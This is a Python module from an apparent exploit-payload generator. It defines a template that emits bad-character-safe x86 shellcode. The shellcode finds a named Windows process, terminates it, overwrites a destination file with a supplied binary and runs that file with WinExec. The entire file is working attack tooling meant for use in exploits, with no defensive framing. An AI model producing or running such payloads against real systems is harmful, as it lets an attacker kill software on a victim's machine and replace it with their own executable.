"""Kill-copy-restart payload template.

Enumerates processes via Toolhelp32 snapshot, kills the target by name,
waits for termination, copies a replacement binary, and relaunches it.

Template sequence:
  CreateToolhelp32Snapshot -> Process32First/Next loop (find by name) ->
  OpenProcess(PROCESS_TERMINATE) -> TerminateProcess ->
  WaitForSingleObject(INFINITE) -> CloseHandle ->
  CopyFileA(src, dst) -> WinExec(dst)

Required functions: CreateToolhelp32Snapshot, Process32First, Process32Next,
                    OpenProcess, TerminateProcess, WaitForSingleObject,
                    CloseHandle, CopyFileA, WinExec
Required variables: snapshot_handle, target_pid
Required strings:   process_name, src_path, dst_path
"""
from __future__ import annotations

from ..encode import (
    encode_dword,
    safe_call_mem,
    safe_dword_store,
    safe_lea,
    safe_mem_store,
    safe_push_dword,
    safe_push_imm,
    safe_push_mem,
)
from .base import PayloadTemplate, TemplateConfig


class ProcessReplaceTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        snap_off     = -layout.slot("CreateToolhelp32Snapshot").offset
        p32first_off = -layout.slot("Process32First").offset
        p32next_off  = -layout.slot("Process32Next").offset
        openproc_off = -layout.slot("OpenProcess").offset
        termproc_off = -layout.slot("TerminateProcess").offset
        waitobj_off  = -layout.slot("WaitForSingleObject").offset
        closehdl_off = -layout.slot("CloseHandle").offset
        copyfile_off = -layout.slot("CopyFileA").offset
        winexec_off  = -layout.slot("WinExec").offset

        snap_h_off   = -layout.slot("snapshot_handle").offset
        pid_off      = -layout.slot("target_pid").offset

        pname_off    = -layout.slot("process_name").offset
        src_off      = -layout.slot("src_path").offset
        dst_off      = -layout.slot("dst_path").offset

        pe32_off     = -layout.slot("PROCESSENTRY32").offset

        return "\n".join([
            "; -- Process Replace Payload (Kill-Copy-Restart) --",
            f"; Target process: {config.process_name}",
            f"; Source: {config.src_path}",
            f"; Destination: {config.dst_path}",
            "",

            # --- Phase 1: Enumerate processes ---
            "    ; Set PROCESSENTRY32.dwSize = 0x128",
            *safe_lea("edi", "ebp", pe32_off, bc),
            *encode_dword(0x128, bc, "eax"),
            *safe_dword_store("edi", 0x00, "eax", bc, tmp="ecx"),
            "",

            "    ; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)",
            "    xor  eax, eax",
            "    push eax                    ; th32ProcessID = 0",
            *safe_push_imm(2, bc),
            "    ; TH32CS_SNAPPROCESS",
            *safe_call_mem("ebp", snap_off, bc),
            *safe_mem_store("ebp", snap_h_off, "eax", bc),
            "",

            "    ; Process32First(hSnapshot, &pe32)",
            *safe_lea("eax", "ebp", pe32_off, bc),
            "    push eax                    ; lppe",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", p32first_off, bc),
            "    test eax, eax",
            "    jz   pr_not_found",
            "",

            "pr_enum_loop:",
            "    ; Compare pe32.szExeFile with process_name (case-insensitive)",
            *safe_lea("esi", "ebp", pe32_off, bc),
            "    add  esi, 0x24              ; szExeFile offset within PROCESSENTRY32",
            *safe_lea("edi", "ebp", pname_off, bc),
            "",
            "pr_strcmp:",
            "    lodsb                        ; al = *esi++",
            "    mov  cl, byte ptr [edi]",
            "    inc  edi",
            "    test al, al",
            "    jz   pr_check_end            ; source hit null",
            "    or   al, 0x20               ; force lowercase (only non-null)",
            "    or   cl, 0x20",
            "    cmp  al, cl",
            "    jne  pr_next",
            "    jmp  pr_strcmp",
            "",
            "pr_check_end:",
            "    test cl, cl                  ; both null = match",
            "    jz   pr_found",
            "    ; fall through to pr_next (lengths differ)",
            "",
            "pr_next:",
            "    ; Process32Next(hSnapshot, &pe32)",
            *safe_lea("eax", "ebp", pe32_off, bc),
            "    push eax                    ; lppe",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", p32next_off, bc),
            "    test eax, eax",
            "    jnz  pr_enum_loop",
            "",

            "pr_not_found:",
            "    ; CloseHandle(hSnapshot) before copy",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "    jmp  pr_do_copy              ; process not running, skip kill",
            "",

            "pr_found:",
            "    ; Save PID from pe32.th32ProcessID",
            *safe_lea("edi", "ebp", pe32_off, bc),
            "    mov  eax, dword ptr [edi+0x08]",
            *safe_mem_store("ebp", pid_off, "eax", bc),
            "",

            "    ; CloseHandle(hSnapshot)",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            # --- Phase 2: Kill the process ---
            "    ; OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId)",
            *safe_push_mem("ebp", pid_off, bc),
            "    xor  eax, eax",
            "    push eax                    ; bInheritHandle = FALSE",
            *safe_push_imm(1, bc),
            "    ; PROCESS_TERMINATE = 0x0001",
            *safe_call_mem("ebp", openproc_off, bc),
            "    test eax, eax",
            "    jnz  pr_kill                 ; got handle, proceed to kill",
            "    jmp  pr_do_copy              ; could not open, snapshot already closed",
            "",
            "pr_kill:",
            "    mov  ebx, eax               ; save hProcess",
            "",

            "    ; TerminateProcess(hProcess, 0)",
            "    xor  ecx, ecx",
            "    push ecx                    ; uExitCode = 0",
            "    push ebx                    ; hProcess",
            *safe_call_mem("ebp", termproc_off, bc),
            "",

            "    ; WaitForSingleObject(hProcess, INFINITE)",
            *safe_push_dword(0xFFFFFFFF, bc),
            "    ; dwMilliseconds = INFINITE",
            "    push ebx                    ; hProcess",
            *safe_call_mem("ebp", waitobj_off, bc),
            "",

            "    ; CloseHandle(hProcess)",
            "    push ebx",
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            # --- Phase 3: Copy and restart ---
            "    nop                          ; displacement padding",
            "pr_do_copy:",
            "    ; CopyFileA(src_path, dst_path, FALSE)",
            "    xor  eax, eax",
            "    push eax                    ; bFailIfExists = FALSE",
            *safe_lea("eax", "ebp", dst_off, bc),
            "    push eax                    ; lpNewFileName",
            *safe_lea("eax", "ebp", src_off, bc),
            "    push eax                    ; lpExistingFileName",
            *safe_call_mem("ebp", copyfile_off, bc),
            "    test eax, eax",
            "    jz   pr_done                  ; CopyFileA failed, do not launch",
            "",

            "    ; WinExec(dst_path, SW_SHOWNORMAL)",
            *safe_push_imm(1, bc),
            "    ; SW_SHOWNORMAL",
            *safe_lea("eax", "ebp", dst_off, bc),
            "    push eax                    ; lpCmdLine",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
            "pr_done:",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Target process", config.process_name or "target.exe"),
            ("Source file", config.src_path or ""),
            ("Destination (also executed)", config.dst_path or ""),
        ]
